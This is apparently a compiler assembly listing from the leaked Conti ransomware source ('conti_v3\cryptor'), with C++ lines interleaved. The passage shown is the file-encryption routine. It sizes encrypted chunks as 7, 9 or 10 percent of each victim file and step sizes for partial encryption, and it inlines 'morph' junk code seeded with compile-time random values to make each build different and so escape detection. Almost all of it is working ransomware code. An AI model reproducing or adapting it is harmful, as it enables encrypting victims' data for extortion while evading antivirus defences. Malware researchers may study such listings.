  002d7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$20[rbp-81]
  002da	f7 e9		 imul	 ecx
  002dc	8b c2		 mov	 eax, edx
  002de	c1 e8 1f	 shr	 eax, 31
  002e1	03 d0		 add	 edx, eax
  002e3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002e6	3b c8		 cmp	 ecx, eax
  002e8	75 26		 jne	 SHORT $LN273@EncryptPar
  002ea	66 0f 1f 44 00
	00		 npad	 6
$LL268@EncryptPar:
  002f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]
  002f3	ff c0		 inc	 eax
  002f5	89 45 df	 mov	 DWORD PTR _morph_var$20[rbp-81], eax
  002f8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002fd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$20[rbp-81]
  00300	f7 e9		 imul	 ecx
  00302	8b c2		 mov	 eax, edx
  00304	c1 e8 1f	 shr	 eax, 31
  00307	03 d0		 add	 edx, eax
  00309	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0030c	3b c8		 cmp	 ecx, eax
  0030e	74 e0		 je	 SHORT $LL268@EncryptPar
$LN273@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1003 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00310	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00314	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00318	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0031b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$19[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00322	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$19[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1003 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00325	48 99		 cdq
  00327	48 2b c2	 sub	 rax, rdx
  0032a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00331	48 d1 f8	 sar	 rax, 1
  00334	4c 8b e0	 mov	 r12, rax
  00337	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0033b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00340	f7 e9		 imul	 ecx
  00342	8b c2		 mov	 eax, edx
  00344	c1 e8 1f	 shr	 eax, 31
  00347	03 d0		 add	 edx, eax
  00349	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0034c	3b c8		 cmp	 ecx, eax
  0034e	74 52		 je	 SHORT $LN295@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00350	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$19[rbp-81]
  00353	83 c1 02	 add	 ecx, 2
  00356	41 03 cc	 add	 ecx, r12d
  00359	89 4d df	 mov	 DWORD PTR _morph_var$19[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0035c	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]
  0035f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00364	7d 07		 jge	 SHORT $LN1213@EncryptPar
  00366	ff c8		 dec	 eax
  00368	83 c8 fc	 or	 eax, -4
  0036b	ff c0		 inc	 eax
$LN1213@EncryptPar:
  0036d	85 c0		 test	 eax, eax
  0036f	0f 85 bb 10 00
	00		 jne	 $LN378@EncryptPar
  00375	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL287@EncryptPar:
  00380	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]
  00383	ff c0		 inc	 eax
  00385	89 45 df	 mov	 DWORD PTR _morph_var$19[rbp-81], eax
  00388	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]
  0038b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00390	7d 07		 jge	 SHORT $LN1212@EncryptPar
  00392	ff c8		 dec	 eax
  00394	83 c8 fc	 or	 eax, -4
  00397	ff c0		 inc	 eax
$LN1212@EncryptPar:
  00399	85 c0		 test	 eax, eax
  0039b	74 e3		 je	 SHORT $LL287@EncryptPar

; 51   : 	}

  0039d	e9 8e 10 00 00	 jmp	 $LN378@EncryptPar
$LN295@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  003a2	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  003a5	b9 02 00 00 00	 mov	 ecx, 2
  003aa	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]
  003ad	41 2b cc	 sub	 ecx, r12d
  003b0	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  003b2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003b7	89 4d df	 mov	 DWORD PTR _morph_var$19[rbp-81], ecx
  003ba	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$19[rbp-81]
  003bd	f7 e9		 imul	 ecx
  003bf	8b c2		 mov	 eax, edx
  003c1	c1 e8 1f	 shr	 eax, 31
  003c4	03 d0		 add	 edx, eax
  003c6	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003c9	3b c8		 cmp	 ecx, eax
  003cb	0f 85 5f 10 00
	00		 jne	 $LN378@EncryptPar
  003d1	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL289@EncryptPar:
  003e0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$19[rbp-81]
  003e3	ff c0		 inc	 eax
  003e5	89 45 df	 mov	 DWORD PTR _morph_var$19[rbp-81], eax
  003e8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003ed	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$19[rbp-81]
  003f0	f7 e9		 imul	 ecx
  003f2	8b c2		 mov	 eax, edx
  003f4	c1 e8 1f	 shr	 eax, 31
  003f7	03 d0		 add	 edx, eax
  003f9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003fc	3b c8		 cmp	 ecx, eax
  003fe	74 e0		 je	 SHORT $LL289@EncryptPar

; 55   : 	}

  00400	e9 2b 10 00 00	 jmp	 $LN378@EncryptPar
$LN11@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1008 : 		PartSize = (FileInfo->FileSize / 100) * 7;

  00405	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  0040f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00413	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00417	48 c1 fa 06	 sar	 rdx, 6
  0041b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0041e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$18[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00425	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$18[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1008 : 		PartSize = (FileInfo->FileSize / 100) * 7;

  00428	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  0042c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0042f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1008 : 		PartSize = (FileInfo->FileSize / 100) * 7;

  00434	4c 6b fa 07	 imul	 r15, rdx, 7
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00438	f7 e9		 imul	 ecx
  0043a	8b c2		 mov	 eax, edx
  0043c	c1 e8 1f	 shr	 eax, 31
  0043f	03 d0		 add	 edx, eax
  00441	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00444	3b c8		 cmp	 ecx, eax
  00446	74 47		 je	 SHORT $LN316@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00448	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$18[rbp-81]
  0044b	83 c1 02	 add	 ecx, 2
  0044e	41 03 cf	 add	 ecx, r15d
  00451	89 4d df	 mov	 DWORD PTR _morph_var$18[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00454	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]
  00457	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0045c	7d 07		 jge	 SHORT $LN1210@EncryptPar
  0045e	ff c8		 dec	 eax
  00460	83 c8 fc	 or	 eax, -4
  00463	ff c0		 inc	 eax
$LN1210@EncryptPar:
  00465	85 c0		 test	 eax, eax
  00467	75 77		 jne	 SHORT $LN315@EncryptPar
  00469	0f 1f 80 00 00
	00 00		 npad	 7
$LL308@EncryptPar:
  00470	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]
  00473	ff c0		 inc	 eax
  00475	89 45 df	 mov	 DWORD PTR _morph_var$18[rbp-81], eax
  00478	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]
  0047b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00480	7d 07		 jge	 SHORT $LN1209@EncryptPar
  00482	ff c8		 dec	 eax
  00484	83 c8 fc	 or	 eax, -4
  00487	ff c0		 inc	 eax
$LN1209@EncryptPar:
  00489	85 c0		 test	 eax, eax
  0048b	74 e3		 je	 SHORT $LL308@EncryptPar

; 51   : 	}

  0048d	eb 51		 jmp	 SHORT $LN315@EncryptPar
$LN316@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0048f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00492	b9 02 00 00 00	 mov	 ecx, 2
  00497	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]
  0049a	41 2b cf	 sub	 ecx, r15d
  0049d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0049f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004a4	89 4d df	 mov	 DWORD PTR _morph_var$18[rbp-81], ecx
  004a7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$18[rbp-81]
  004aa	f7 e9		 imul	 ecx
  004ac	8b c2		 mov	 eax, edx
  004ae	c1 e8 1f	 shr	 eax, 31
  004b1	03 d0		 add	 edx, eax
  004b3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004b6	3b c8		 cmp	 ecx, eax
  004b8	75 26		 jne	 SHORT $LN315@EncryptPar
  004ba	66 0f 1f 44 00
	00		 npad	 6
$LL310@EncryptPar:
  004c0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$18[rbp-81]
  004c3	ff c0		 inc	 eax
  004c5	89 45 df	 mov	 DWORD PTR _morph_var$18[rbp-81], eax
  004c8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004cd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$18[rbp-81]
  004d0	f7 e9		 imul	 ecx
  004d2	8b c2		 mov	 eax, edx
  004d4	c1 e8 1f	 shr	 eax, 31
  004d7	03 d0		 add	 edx, eax
  004d9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004dc	3b c8		 cmp	 ecx, eax
  004de	74 e0		 je	 SHORT $LL310@EncryptPar
$LN315@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1011 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  004e0	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  004e4	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  004e8	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  004eb	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$2[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  004f2	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$2[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1011 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  004f5	48 99		 cdq
  004f7	48 2b c2	 sub	 rax, rdx
  004fa	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00501	48 d1 f8	 sar	 rax, 1
  00504	4c 8b e0	 mov	 r12, rax
  00507	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0050b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00510	f7 e9		 imul	 ecx
  00512	8b c2		 mov	 eax, edx
  00514	c1 e8 1f	 shr	 eax, 31
  00517	03 d0		 add	 edx, eax
  00519	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0051c	3b c8		 cmp	 ecx, eax
  0051e	74 52		 je	 SHORT $LN652@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00520	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$2[rbp-81]
  00523	83 c1 02	 add	 ecx, 2
  00526	41 03 cc	 add	 ecx, r12d
  00529	89 4d df	 mov	 DWORD PTR _morph_var$2[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0052c	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]
  0052f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00534	7d 07		 jge	 SHORT $LN1207@EncryptPar
  00536	ff c8		 dec	 eax
  00538	83 c8 fc	 or	 eax, -4
  0053b	ff c0		 inc	 eax
$LN1207@EncryptPar:
  0053d	85 c0		 test	 eax, eax
  0053f	0f 85 eb 0e 00
	00		 jne	 $LN378@EncryptPar
  00545	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL644@EncryptPar:
  00550	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]
  00553	ff c0		 inc	 eax
  00555	89 45 df	 mov	 DWORD PTR _morph_var$2[rbp-81], eax
  00558	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]
  0055b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00560	7d 07		 jge	 SHORT $LN1206@EncryptPar
  00562	ff c8		 dec	 eax
  00564	83 c8 fc	 or	 eax, -4
  00567	ff c0		 inc	 eax
$LN1206@EncryptPar:
  00569	85 c0		 test	 eax, eax
  0056b	74 e3		 je	 SHORT $LL644@EncryptPar

; 51   : 	}

  0056d	e9 be 0e 00 00	 jmp	 $LN378@EncryptPar
$LN652@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00572	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00575	b9 02 00 00 00	 mov	 ecx, 2
  0057a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]
  0057d	41 2b cc	 sub	 ecx, r12d
  00580	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00582	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00587	89 4d df	 mov	 DWORD PTR _morph_var$2[rbp-81], ecx
  0058a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$2[rbp-81]
  0058d	f7 e9		 imul	 ecx
  0058f	8b c2		 mov	 eax, edx
  00591	c1 e8 1f	 shr	 eax, 31
  00594	03 d0		 add	 edx, eax
  00596	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00599	3b c8		 cmp	 ecx, eax
  0059b	0f 85 8f 0e 00
	00		 jne	 $LN378@EncryptPar
  005a1	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL646@EncryptPar:
  005b0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$2[rbp-81]
  005b3	ff c0		 inc	 eax
  005b5	89 45 df	 mov	 DWORD PTR _morph_var$2[rbp-81], eax
  005b8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  005bd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$2[rbp-81]
  005c0	f7 e9		 imul	 ecx
  005c2	8b c2		 mov	 eax, edx
  005c4	c1 e8 1f	 shr	 eax, 31
  005c7	03 d0		 add	 edx, eax
  005c9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  005cc	3b c8		 cmp	 ecx, eax
  005ce	74 e0		 je	 SHORT $LL646@EncryptPar

; 55   : 	}

  005d0	e9 5b 0e 00 00	 jmp	 $LN378@EncryptPar
$LN12@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1016 : 		PartSize = (FileInfo->FileSize / 100) * 9;

  005d5	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  005df	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  005e3	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  005e7	48 c1 fa 06	 sar	 rdx, 6
  005eb	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  005ee	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$3[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  005f5	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$3[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1016 : 		PartSize = (FileInfo->FileSize / 100) * 9;

  005f8	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  005fc	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  005ff	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1016 : 		PartSize = (FileInfo->FileSize / 100) * 9;

  00604	4c 8d 3c d2	 lea	 r15, QWORD PTR [rdx+rdx*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00608	f7 e9		 imul	 ecx
  0060a	8b c2		 mov	 eax, edx
  0060c	c1 e8 1f	 shr	 eax, 31
  0060f	03 d0		 add	 edx, eax
  00611	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00614	3b c8		 cmp	 ecx, eax
  00616	74 47		 je	 SHORT $LN631@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00618	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$3[rbp-81]
  0061b	83 c1 02	 add	 ecx, 2
  0061e	41 03 cf	 add	 ecx, r15d
  00621	89 4d df	 mov	 DWORD PTR _morph_var$3[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00624	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]
  00627	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0062c	7d 07		 jge	 SHORT $LN1204@EncryptPar
  0062e	ff c8		 dec	 eax
  00630	83 c8 fc	 or	 eax, -4
  00633	ff c0		 inc	 eax
$LN1204@EncryptPar:
  00635	85 c0		 test	 eax, eax
  00637	75 77		 jne	 SHORT $LN630@EncryptPar
  00639	0f 1f 80 00 00
	00 00		 npad	 7
$LL623@EncryptPar:
  00640	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]
  00643	ff c0		 inc	 eax
  00645	89 45 df	 mov	 DWORD PTR _morph_var$3[rbp-81], eax
  00648	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]
  0064b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00650	7d 07		 jge	 SHORT $LN1203@EncryptPar
  00652	ff c8		 dec	 eax
  00654	83 c8 fc	 or	 eax, -4
  00657	ff c0		 inc	 eax
$LN1203@EncryptPar:
  00659	85 c0		 test	 eax, eax
  0065b	74 e3		 je	 SHORT $LL623@EncryptPar

; 51   : 	}

  0065d	eb 51		 jmp	 SHORT $LN630@EncryptPar
$LN631@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0065f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00662	b9 02 00 00 00	 mov	 ecx, 2
  00667	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]
  0066a	41 2b cf	 sub	 ecx, r15d
  0066d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0066f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00674	89 4d df	 mov	 DWORD PTR _morph_var$3[rbp-81], ecx
  00677	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$3[rbp-81]
  0067a	f7 e9		 imul	 ecx
  0067c	8b c2		 mov	 eax, edx
  0067e	c1 e8 1f	 shr	 eax, 31
  00681	03 d0		 add	 edx, eax
  00683	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00686	3b c8		 cmp	 ecx, eax
  00688	75 26		 jne	 SHORT $LN630@EncryptPar
  0068a	66 0f 1f 44 00
	00		 npad	 6
$LL625@EncryptPar:
  00690	8b 45 df	 mov	 eax, DWORD PTR _morph_var$3[rbp-81]
  00693	ff c0		 inc	 eax
  00695	89 45 df	 mov	 DWORD PTR _morph_var$3[rbp-81], eax
  00698	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0069d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$3[rbp-81]
  006a0	f7 e9		 imul	 ecx
  006a2	8b c2		 mov	 eax, edx
  006a4	c1 e8 1f	 shr	 eax, 31
  006a7	03 d0		 add	 edx, eax
  006a9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  006ac	3b c8		 cmp	 ecx, eax
  006ae	74 e0		 je	 SHORT $LL625@EncryptPar
$LN630@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1019 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  006b0	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  006b4	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  006b8	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  006bb	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$4[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  006c2	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$4[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1019 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  006c5	48 99		 cdq
  006c7	48 2b c2	 sub	 rax, rdx
  006ca	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  006d1	48 d1 f8	 sar	 rax, 1
  006d4	4c 8b e0	 mov	 r12, rax
  006d7	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  006db	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  006e0	f7 e9		 imul	 ecx
  006e2	8b c2		 mov	 eax, edx
  006e4	c1 e8 1f	 shr	 eax, 31
  006e7	03 d0		 add	 edx, eax
  006e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  006ec	3b c8		 cmp	 ecx, eax
  006ee	74 52		 je	 SHORT $LN610@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  006f0	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$4[rbp-81]
  006f3	83 c1 02	 add	 ecx, 2
  006f6	41 03 cc	 add	 ecx, r12d
  006f9	89 4d df	 mov	 DWORD PTR _morph_var$4[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  006fc	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]
  006ff	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00704	7d 07		 jge	 SHORT $LN1201@EncryptPar
  00706	ff c8		 dec	 eax
  00708	83 c8 fc	 or	 eax, -4
  0070b	ff c0		 inc	 eax
$LN1201@EncryptPar:
  0070d	85 c0		 test	 eax, eax
  0070f	0f 85 1b 0d 00
	00		 jne	 $LN378@EncryptPar
  00715	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL602@EncryptPar:
  00720	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]
  00723	ff c0		 inc	 eax
  00725	89 45 df	 mov	 DWORD PTR _morph_var$4[rbp-81], eax
  00728	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]
  0072b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00730	7d 07		 jge	 SHORT $LN1200@EncryptPar
  00732	ff c8		 dec	 eax
  00734	83 c8 fc	 or	 eax, -4
  00737	ff c0		 inc	 eax
$LN1200@EncryptPar:
  00739	85 c0		 test	 eax, eax
  0073b	74 e3		 je	 SHORT $LL602@EncryptPar

; 51   : 	}

  0073d	e9 ee 0c 00 00	 jmp	 $LN378@EncryptPar
$LN610@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00742	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00745	b9 02 00 00 00	 mov	 ecx, 2
  0074a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]
  0074d	41 2b cc	 sub	 ecx, r12d
  00750	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00752	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00757	89 4d df	 mov	 DWORD PTR _morph_var$4[rbp-81], ecx
  0075a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$4[rbp-81]
  0075d	f7 e9		 imul	 ecx
  0075f	8b c2		 mov	 eax, edx
  00761	c1 e8 1f	 shr	 eax, 31
  00764	03 d0		 add	 edx, eax
  00766	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00769	3b c8		 cmp	 ecx, eax
  0076b	0f 85 bf 0c 00
	00		 jne	 $LN378@EncryptPar
  00771	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL604@EncryptPar:
  00780	8b 45 df	 mov	 eax, DWORD PTR _morph_var$4[rbp-81]
  00783	ff c0		 inc	 eax
  00785	89 45 df	 mov	 DWORD PTR _morph_var$4[rbp-81], eax
  00788	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0078d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$4[rbp-81]
  00790	f7 e9		 imul	 ecx
  00792	8b c2		 mov	 eax, edx
  00794	c1 e8 1f	 shr	 eax, 31
  00797	03 d0		 add	 edx, eax
  00799	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0079c	3b c8		 cmp	 ecx, eax
  0079e	74 e0		 je	 SHORT $LL604@EncryptPar

; 55   : 	}

  007a0	e9 8b 0c 00 00	 jmp	 $LN378@EncryptPar
$LN13@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1024 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  007a5	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  007af	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  007b3	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  007b7	48 c1 fa 06	 sar	 rdx, 6
  007bb	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  007be	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$5[rbp-81], 1547201 ; 00179bc1H

